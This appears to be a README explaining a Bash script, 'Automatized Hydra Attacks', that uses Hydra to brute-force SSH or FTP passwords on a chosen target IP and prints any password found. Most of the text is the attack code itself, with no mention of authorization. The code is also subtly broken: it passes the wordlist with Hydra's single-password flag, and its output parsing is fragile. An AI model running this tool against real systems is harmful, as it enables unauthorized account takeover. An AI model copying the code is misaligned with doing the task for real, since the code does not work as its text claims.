# Automatized Hydra Attacks

## SSH and FTP Bruteforce Attack Script with Hydra

This script uses Hydra to perform a bruteforce attack on a target IP address via SSH or FTP. It takes the target IP address, username, and dictionary file as input from the user.

### Prerequisites

- Hydra must be installed on the system.
- The dictionary file must exist in the current directory.

### Step-by-Step Explanation of the Code

1. **Check if Hydra is installed**: The script first checks if Hydra is installed on the system. If it is not, the user is prompted to install it. If the user chooses not to install Hydra, the script exits.

```shellscript
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Would you like to install it? (yes/no): "
    read choice

    if [ "$choice" = 'yes' ]; then
        echo "Attempting to install hydra..."

        # give specific installation command for hydra depending on the system
        # if your system uses apt-get
        sudo apt-get update
        sudo apt-get install hydra

        # if your system uses yum
        # sudo yum install hydra

        # if your system uses pacman
        # sudo pacman -S hydra

        echo "Hydra has been installed. Please run the script again."
        exit 0
    else
        echo "Exiting the script..."
        exit 0
    fi
else
    echo "Hydra is installed"
fi
```

2. **Check if the dictionary file exists**: The script then checks if the dictionary file exists in the current directory. If it does not, the user is notified and the script exits.

```shellscript
if [ ! -f "$dictionary" ]; then
    echo -e "${red}The file $dictionary does not exist. You must put it inside the current directory${no_color}"
    exit 1
fi
```

3. **SSH attack function**: This function starts the bruteforce attack on the target IP address via SSH. It uses Hydra with the specified username and dictionary file, and sets the number of threads to 4 for increased speed. The output of Hydra is captured in a variable.

```shellscript
ssh_attack(){
    echo -e "${green}Starting security audit via SSH on $target ... ${no_color} "
    sleep 2
    output=$(hydra -l "$user" -p "$dictionary" ssh://"$target" -t 4 -vV 2>/dev/null)

    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${green} Password found is ${no_color} $password"
    else
        echo -e "${red} Password not found on the archive${no_color}"
        exit 1
    fi
}
```
4. **FTP attack function**: This function starts the bruteforce attack on the target IP address via FTPç. It uses Hydra with the specified username and dictionary file, and sets the number of threads to 4 for increased speed. The output of Hydra is captured in a variable.

```shellscript
ftp_attack(){
    echo -e "${green}Starting security audit via FTP on $target ... ${no_color} "
    sleep 2
    output=$(hydra -l "$user" -p "$dictionary" ftp://"$target" -t 4 -vV 2>&1)

    if echo "$output" | grep -qi "login:\|password:"; then
        password=$(echo "$output" | grep -oP "password: \K.*")
        echo -e "${green} Password found is ${no_color} $password"
    else
        echo -e "${red} Password not found on the archive${no_color}"
        exit 1
    fi
}
```
5. **Choose function**: This section ensures that the user provides a valid input ("SSH" or "FTP") for the type of attack they want to perform. If the input is valid, the corresponding function (ssh_attack or ftp_attack) is called. If the input is not valid, an error message is displayed, and the script exits with an error code.

```shellscript
read -p "Choose if you want to do the attack via SSH or FTP (write SSH or FTP): " choose
if [ "$choose" == "SSH" ]; then
    ssh_attack
elif [ "$choose" == "FTP" ]; then
    ftp_attack
else
    echo -e "${red} You must write SSH or FTP${no_color}"
    exit 1
fi
```
